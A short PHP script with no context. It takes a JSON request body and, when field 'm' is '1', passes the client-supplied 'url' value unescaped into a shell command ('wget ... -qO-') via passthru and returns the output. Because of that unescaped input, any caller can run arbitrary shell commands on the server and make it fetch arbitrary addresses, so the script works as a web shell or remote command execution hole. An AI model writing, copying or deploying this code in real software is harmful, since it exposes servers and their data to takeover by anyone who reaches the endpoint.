<?php

   $p = file_get_contents('php://input');
   $po = json_decode($p);
  
   if ($po->m == "1") {
      passthru("wget $po->url -qO-");
   }

?>